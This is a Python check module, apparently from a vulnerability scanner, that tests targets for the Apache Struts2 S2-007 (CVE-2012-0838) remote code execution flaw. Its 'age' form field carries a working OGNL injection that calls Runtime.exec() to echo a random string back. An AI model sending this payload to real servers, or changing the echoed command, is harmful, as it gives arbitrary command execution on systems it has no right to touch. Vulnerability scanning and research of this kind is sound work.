#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_007_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-007漏洞,又名CVE-2012-0838漏洞',
            'description': 'Struts2 S2-007漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.2.3',
            'date': '2011-09-03',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/user.action'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent()
        } 
        self.check_payload = {
            'name': "1",
            'email': "7777777@qq.com",
            'age': '''\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(''' + '\'' +'echo ' + self.capta + '\'' + ''').getInputStream())) + \''''
        }
        
    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.post(self.url, data = self.check_payload, headers = self.headers)
            req_result = await check_req.text()
            check_str = re.sub('\n', '', req_result)
            if check_str:
                result = re.findall('''<input type="text" name="age" value="(.*?)" id="user_age"/></td>''', check_str)
                if result:
                    if self.capta in result:
                        return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_007 = S2_007_BaseVerify('http://localhost:8080/S2_007_war_exploded')